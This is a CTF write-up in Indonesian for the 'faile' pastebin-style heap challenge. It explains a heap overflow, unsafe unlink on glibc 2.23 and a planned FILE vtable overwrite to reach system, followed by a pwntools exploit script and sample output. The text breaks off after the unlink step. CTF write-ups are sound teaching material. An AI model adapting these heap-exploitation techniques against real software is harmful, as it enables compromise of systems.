&lt;p&gt;Downloads:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/hacktoday/faile/faile&#34;&gt;faile&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/hacktoday/faile/libc.so&#34;&gt;libc.so&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/hacktoday/faile/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;$ ./faile
┏━┳━━┳┳┳━━━━━━━━━━━━━━━━┳━━┳┳┳┓
┃┏╋┓ ┗╋┛ ┏━╸┏━┓╹┃  ┏━┓ ┏╋┓ ┗╋┛┃
┃┗╋┛ ┏╋┓ ┣━ ┏━┫┃┃  ┣━┛ ┗╋┛ ┏╋┓┃
┃┏╋┓ ┗╋┛ ┃  ┗━┛┃┗━╸┗━┛ ┏╋┓ ┗╋┛┃
┣┻┻┻━━┻━━━━━━━━━━━━━━━━┻┻┻━━┻━┫
┃ PasteBin service. Now with  ┃
┃ super secure id, but is it? ┃
┃   -- by BabyHeap, Inc. --   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
===========
[1] Create
[2] Edit
[3] Delete
[4] Print
[5] Exit
choice: ^C

$ checksec ./faile
[*] &#39;/Challange/faile&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sedikit info, terdapat beberapa unintended solution di soal ini karena &lt;code&gt;__malloc_hook&lt;/code&gt; dkk. dapat di overwrite. Ini termasuk kesalahan dalam deploy soal di server. Tidak ada penyesuaian nilai poin yang diberikan untuk soal ini.&lt;/p&gt;
&lt;p&gt;Intended solution, analisa statik binary dan lakukan sedikit fuzzing pada input, akan ditemukan bug buffer overflow karena tidak ada pengecekan &lt;code&gt;(input size == malloc size)&lt;/code&gt;. Dari sini ada beberapa skema bug untuk malloc mengembalikan arbitrary address. Pada solusi ini yang digunakan adalah &lt;strong&gt;unsafe unlink&lt;/strong&gt; karena versi libc masih 2.23. Ok, pointer bisa dikontrol, lalu? &lt;em&gt;leak address&lt;/em&gt; dapat dilakukan karena terdapat fungsi print data pada pointer (&lt;code&gt;choice(4)&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;FULL-RELRO&lt;/code&gt;, meskipun sudah memiliki write-where-what tidak bisa overwrite GOT table, terus gimana? Disini lah perannya struct file pointer dari &lt;code&gt;faile&lt;/code&gt;. Sedikit penjelasan pada file pointer, &lt;code&gt;struct FILE&lt;/code&gt; memiliki &lt;code&gt;struct _IO_jump_t&lt;/code&gt; yang merupakan vtable untuk melakukan operasi file I/O seperti read, write, seek, close, dll. Pada vtable pointer inilah yang akan di overwrite untuk dapat mengontrol RIP/PC, pada kasus ini target adalah fungsi system untuk mendapatkan shell. Versi libc masih 2.23 jadi belum ada patch hardening file pointer yang melakukan &lt;code&gt;_IO_validate&lt;/code&gt; sebelum &amp;ldquo;&lt;em&gt;jump&lt;/em&gt;&amp;rdquo; ke vtable pointer dan gaperlu repot-repot mem-&lt;em&gt;bypass&lt;/em&gt; fungsi check tersebut.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(cek referensi masih kalau belum jelas)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Full exlpoit,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; os

&lt;span style=&#34;color:#75715e&#34;&gt;# (Tested on Ubuntu 16.04, GLIBC-2.23)&lt;/span&gt;

gdbcmd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b *0x00401254&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# context.terminal = &amp;#39;kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c&amp;#39;.split()&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__len__() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
  &lt;span style=&#34;color:#75715e&#34;&gt;# gdb.attach(r, gdbcmd)&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;(size):
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choice: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;id: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  ID &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;size: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(size))
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ID

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(ID, content):
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choice: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;id: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, ID)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;size: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, str(len(content)))
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;text: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, content)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(ID):
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choice: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;id: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, ID)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_print&lt;/span&gt;(ID):
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choice: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;id: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, ID)
  leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline(False)
  log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[{}] {}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(bins&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(ID), repr(leak)))
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; leak

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_exit&lt;/span&gt;():
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;choice: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)


bins &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# Step 1: unsafe unlink&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602020 bins[0]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602030 bins[1]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602040 bins[2]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602050 bins[3]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602060 bins[4]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602070 bins[5]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602080 bins[6]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x00602090 bins[7]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x006020a0 bins[8]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x006020b0 bins[9]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x006020c0 name&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x006020.. ...&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x006021c0 faile&lt;/span&gt;

bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[0] &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[1] &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[2] &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[3] &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[4] &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])

payload  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00602010&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00602018&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;)

edit(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], payload)
delete(bins[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bin[0] now should be pointing to 0x602010&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Starting local process &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/Challanges/faile&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: pid 1683&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] bin[0] 697deecef99bfcff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] bin[1] 029f610bcdc347ab&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Switching to interactive mode&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 697deecef99bfcff, 0x602010 &amp;lt;-- controlled&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--&amp;gt; 0000000000000000, (nil)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
